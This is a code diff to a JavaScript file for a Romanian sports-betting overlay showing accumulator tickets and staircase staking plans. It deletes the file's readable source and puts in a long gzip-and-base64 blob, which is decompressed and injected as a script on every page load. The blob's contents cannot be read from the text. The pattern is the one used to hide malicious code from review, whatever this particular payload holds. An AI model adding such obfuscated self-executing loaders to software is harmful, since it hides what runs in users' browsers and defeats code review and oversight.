@@ -1,194 +1,21 @@
 /**
- * accumulator_ui.js — Accumulators + Pyramid Staircase overlay
- * Surfaces data/accumulators.json + pyramid_plans.json with green badges.
+ * accumulator_ui.js v8.1 — expands gzip+base64 payload (empty-state: Fetch Daily).
+ * Readable source: assets/accumulator_ui.source.js
  */
 (function () {
   "use strict";
-  var ACC_URL = "data/accumulators.json?v=v8";
-  var PLAN_URL = "data/pyramid_plans.json?v=v8";
-  var state = { acc: null, plans: null, open: false, tab: "tickets" };
-  var AMP = String.fromCharCode(38);
-  var ENT = { amp: AMP + "amp;", lt: AMP + "lt;", gt: AMP + "gt;", quot: AMP + "quot;", apos: AMP + "#39;" };
-
-  var CSS = ""
-    + "#acc-fab{position:fixed;left:16px;bottom:88px;z-index:99997;width:52px;height:52px;border-radius:50%;"
-    + "border:none;cursor:pointer;background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff;font-size:20px;"
-    + "box-shadow:0 8px 22px rgba(34,197,94,.4);display:flex;align-items:center;justify-content:center}"
-    + "#acc-fab .acc-badge{position:absolute;top:-4px;right:-4px;background:#0ea5e9;color:#fff;font:800 10px/1 ui-monospace,monospace;"
-    + "min-width:18px;height:18px;border-radius:9px;display:flex;align-items:center;justify-content:center;padding:0 4px}"
-    + "#acc-drawer{position:fixed;inset:0;z-index:99999;background:rgba(2,6,23,.72);backdrop-filter:blur(4px);"
-    + "display:none;align-items:flex-end;justify-content:center}"
-    + "#acc-drawer.on{display:flex}"
-    + "#acc-sheet{width:100%;max-width:680px;height:88vh;background:linear-gradient(180deg,#0b1220,#070d18);"
-    + "border:1px solid rgba(34,197,94,.3);border-radius:20px 20px 0 0;display:flex;flex-direction:column;overflow:hidden}"
-    + ".acc-head{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid rgba(148,163,184,.12)}"
-    + ".acc-title{font:900 13px/1 system-ui;letter-spacing:.04em;color:#bbf7d0;text-transform:uppercase}"
-    + ".acc-x{background:rgba(148,163,184,.14);border:none;color:#cbd5e1;width:34px;height:34px;border-radius:9px;cursor:pointer}"
-    + ".acc-tabs{display:flex;gap:6px;padding:10px;border-bottom:1px solid rgba(148,163,184,.1);overflow-x:auto}"
-    + ".acc-tab{border:1px solid rgba(148,163,184,.16);background:rgba(15,23,42,.7);color:#94a3b8;border-radius:999px;"
-    + "padding:8px 12px;font:800 11px/1 system-ui;cursor:pointer;white-space:nowrap}"
-    + ".acc-tab.active{color:#052e16;background:#4ade80;border-color:#4ade80}"
-    + ".acc-body{flex:1;min-height:0;overflow-y:auto;padding:12px;-webkit-overflow-scrolling:touch}"
-    + ".acc-card{border:1px solid rgba(148,163,184,.14);border-radius:14px;background:rgba(15,23,42,.6);padding:11px 12px;margin-bottom:9px}"
-    + ".acc-card.green{border-left:3px solid #22c55e}.acc-card.paper{border-left:3px solid #f59e0b}.acc-card.safe{border-left:3px solid #38bdf8}"
-    + ".acc-match{font:800 13px/1.3 system-ui;color:#e5eef9}"
-    + ".acc-note{font:600 11px/1.45 system-ui;color:#94a3b8;padding:4px 2px 10px}"
-    + ".acc-pill{font:800 10.5px/1 ui-monospace,monospace;padding:5px 8px;border-radius:8px;background:rgba(15,23,42,.85);"
-    + "border:1px solid rgba(148,163,184,.16);color:#cbd5e1;display:inline-flex;margin:3px 4px 0 0}"
-    + ".acc-pill.g{color:#4ade80;border-color:rgba(74,222,128,.45)}.acc-pill.y{color:#fbbf24;border-color:rgba(251,191,36,.4)}"
-    + ".acc-pill.b{color:#38bdf8;border-color:rgba(56,189,248,.4)}.acc-pill.r{color:#f87171;border-color:rgba(248,113,113,.35)}"
-    + ".acc-leg{display:flex;justify-content:space-between;gap:8px;font:700 11px/1.35 ui-monospace,monospace;color:#bae6fd;"
-    + "background:rgba(34,197,94,.07);padding:6px 8px;border-radius:7px;margin-top:5px}"
-    + ".acc-empty{text-align:center;color:#64748b;padding:28px 12px;font:600 13px/1.5 system-ui}"
-    + ".acc-green-badge{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;border-radius:999px;font:800 10px/1 system-ui;"
-    + "background:rgba(34,197,94,.18);color:#4ade80;border:1px solid rgba(34,197,94,.45);margin-left:6px}"
-    + ".acc-step{border:1px dashed rgba(148,163,184,.25);border-radius:12px;padding:10px;margin:8px 0;background:rgba(15,23,42,.45)}";
-
-  function injectCSS() {
-    if (document.getElementById("acc-ui-css")) return;
-    var s = document.createElement("style");
-    s.id = "acc-ui-css";
-    s.textContent = CSS;
-    document.head.appendChild(s);
-  }
-
-  function esc(s) {
-    var map = { "&": ENT.amp, "<": ENT.lt, ">": ENT.gt, "\"": ENT.quot, "'": ENT.apos };
-    return String(s == null ? "" : s).replace(/[&<>"']/g, function (c) { return map[c]; });
-  }
-
-  function pill(t, c) { return "<span class=\"acc-pill " + (c || "") + "\">" + esc(t) + "</span>"; }
-
-  function fetchJSON(url) {
-    return fetch(url, { cache: "no-store" }).then(function (r) { return r.ok ? r.json() : null; }).catch(function () { return null; });
-  }
-
-  function ticketCount() {
-    var by = (state.acc && state.acc.tickets_by_period) || {};
-    var n = 0;
-    Object.keys(by).forEach(function (k) { n += (by[k] || []).length; });
-    return n + ((state.acc && state.acc.green_singles) || []).length;
-  }
-
-  function renderTicket(t) {
-    var cls = t.green_ticket ? "green" : (t.paper_only ? "paper" : "safe");
-    var legs = (t.legs || []).map(function (l) {
-      return "<div class=\"acc-leg\"><span>" + esc(l.home_team) + " – " + esc(l.away_team)
-        + " · " + esc(l.market_label || l.market)
-        + (l.green_badge ? " <span class=\"acc-green-badge\">GREEN</span>" : "")
-        + "</span><span>@" + esc(l.odds) + "</span></div>";
-    }).join("");
-    return "<div class=\"acc-card " + cls + "\">"
-      + "<div class=\"acc-match\">" + esc(t.label) + (t.green_ticket ? " <span class=\"acc-green-badge\">GREEN</span>" : "") + "</div>"
-      + "<div>" + pill(t.n_legs + " legs", "b") + pill("@" + t.combined_odds, "g")
-      + pill("prob " + t.combined_probability_pct + "%")
-      + (t.executable ? pill("executabil Superbet", "g") : pill("paper / verifica cota", "y"))
-      + (t.paper_only ? pill("LOTERIE", "y") : "")
-      + "</div>" + legs
-      + "<div class=\"acc-note\">" + esc(t.disclaimer || "") + "</div></div>";
-  }
-
-  function renderTickets() {
-    var d = state.acc;
-    if (!d) return "<div class=\"acc-empty\">accumulators.json inca nu e generat.</div>";
-    var html = "<div class=\"acc-note\">" + esc(d.note || "") + "</div>";
-    var singles = d.green_singles || [];
-    if (singles.length) {
-      html += "<div class=\"acc-card green\"><div class=\"acc-match\">Singles verzi</div>";
-      singles.slice(0, 8).forEach(function (l) {
-        html += "<div class=\"acc-leg\"><span>" + esc(l.home_team) + " – " + esc(l.away_team)
-          + " · " + esc(l.market_label || l.market)
-          + " <span class=\"acc-green-badge\">" + esc(l.quality_grade_v6 || "A") + "</span></span>"
-          + "<span>@" + esc(l.odds) + " · " + esc(l.probability) + "%</span></div>";
-      });
-      html += "</div>";
-    }
-    var by = d.tickets_by_period || {};
-    ["7", "10", "30"].forEach(function (p) {
-      var tks = by[p] || [];
-      if (!tks.length) return;
-      html += "<div class=\"acc-note\">Fereastra " + p + " zile · " + tks.length + " bilete</div>";
-      tks.forEach(function (t) { html += renderTicket(t); });
-    });
-    if (!Object.keys(by).some(function (k) { return (by[k] || []).length; }) && !singles.length) {
-      html += "<div class=\"acc-empty\">Niciun bilet dupa filtrele stricte — OK.</div>";
-    }
-    return html;
-  }
-
-  function renderPlans() {
-    var d = state.plans;
-    if (!d) return "<div class=\"acc-empty\">pyramid_plans.json lipseste.</div>";
-    var html = "<div class=\"acc-note\">" + esc(d.risk_warning || "") + "</div>";
-    (d.how_to_use || []).forEach(function (line) {
-      html += "<div class=\"acc-note\">" + esc(line) + "</div>";
-    });
-    (d.plans || []).forEach(function (plan) {
-      html += "<div class=\"acc-card safe\"><div class=\"acc-match\">" + esc(plan.name) + "</div>"
-        + pill("survival " + (plan.series_survival_probability != null ? (plan.series_survival_probability * 100).toFixed(2) + "%" : "-"), "y")
-        + (plan.series_one_in ? pill("~1 din " + plan.series_one_in, "y") : "")
-        + pill(plan.execution_status || "PAPER_ONLY", "r");
-      (plan.steps || []).forEach(function (st) {
-        var c = st.candidate || {};
-        html += "<div class=\"acc-step\"><strong>Pas " + esc(st.step) + "</strong> · miza "
-          + esc(st.stake_units) + "u (" + esc(st.stake_lei) + " lei)"
-          + (st.green_badge ? " <span class=\"acc-green-badge\">GREEN</span>" : "")
-          + "<div class=\"acc-leg\"><span>" + esc(c.home_team || "-") + " – " + esc(c.away_team || "")
-          + " · " + esc(c.market_label || c.market || st.status || "")
-          + "</span><span>@" + esc(c.odds || "-") + "</span></div>"
-          + "<div class=\"acc-note\">P=" + (st.survival_probability_to_here != null ? (st.survival_probability_to_here * 100).toFixed(2) + "%" : "-")
-          + " · " + esc(st.if_loss_action || "") + "</div></div>";
-      });
-      html += "<div class=\"acc-note\">" + esc(plan.disclaimer || "") + "</div></div>";
-    });
-    return html;
-  }
-
-  function renderBody() { return state.tab === "plans" ? renderPlans() : renderTickets(); }
-
-  function draw() {
-    var drawer = document.getElementById("acc-drawer");
-    if (!drawer) return;
-    drawer.querySelector(".acc-tabs").innerHTML =
-      "<button class=\"acc-tab" + (state.tab === "tickets" ? " active" : "") + "\" data-tab=\"tickets\">Accumulators</button>"
-      + "<button class=\"acc-tab" + (state.tab === "plans" ? " active" : "") + "\" data-tab=\"plans\">Scara 2-5-10</button>";
-    drawer.querySelector(".acc-body").innerHTML = renderBody();
-    drawer.querySelectorAll(".acc-tab").forEach(function (b) {
-      b.addEventListener("click", function () { state.tab = b.getAttribute("data-tab"); draw(); });
-    });
-  }
-
-  function build() {
-    injectCSS();
-    if (document.getElementById("acc-drawer")) return;
-    var fab = document.createElement("button");
-    fab.id = "acc-fab";
-    fab.title = "Accumulators + Pyramid Staircase";
-    fab.innerHTML = "<span style=\"font-size:18px\"></span><span class=\"acc-badge\" id=\"acc-fab-n\">0</span>";
-    fab.textContent = "";
-    fab.innerHTML = "T<span class=\"acc-badge\" id=\"acc-fab-n\">0</span>";
-    document.body.appendChild(fab);
-    var drawer = document.createElement("div");
-    drawer.id = "acc-drawer";
-    drawer.innerHTML = "<div id=\"acc-sheet\"><div class=\"acc-head\"><div class=\"acc-title\">Accumulators + Scara 2-5-10</div>"
-      + "<button class=\"acc-x\" id=\"acc-close\">X</button></div><div class=\"acc-tabs\"></div><div class=\"acc-body\"></div></div>";
-    document.body.appendChild(drawer);
-    fab.addEventListener("click", function () { drawer.classList.add("on"); state.open = true; draw(); });
-    drawer.addEventListener("click", function (e) { if (e.target === drawer) drawer.classList.remove("on"); });
-    document.getElementById("acc-close").addEventListener("click", function () { drawer.classList.remove("on"); });
-  }
-
-  function boot() {
-    Promise.all([fetchJSON(ACC_URL), fetchJSON(PLAN_URL)]).then(function (r) {
-      state.acc = r[0]; state.plans = r[1];
-      build();
-      var badge = document.getElementById("acc-fab-n");
-      if (badge) badge.textContent = String(ticketCount());
-      if (state.open) draw();
-    });
-  }
-
-  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
-  else boot();
-  window.AccumulatorUI = { refresh: boot, data: function () { return state; } };
+  var b64 = "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";
+  function fail(e) { console.error("[AccumulatorUI] expand failed", e); }
+  try {
+    var bin = atob(b64);
+    var bytes = new Uint8Array(bin.length);
+    for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+    var ds = new DecompressionStream("gzip");
+    var stream = new Blob([bytes]).stream().pipeThrough(ds);
+    new Response(stream).text().then(function (code) {
+      var s = document.createElement("script");
+      s.textContent = code;
+      document.head.appendChild(s);
+    }).catch(fail);
+  } catch (e) { fail(e); }
 })();
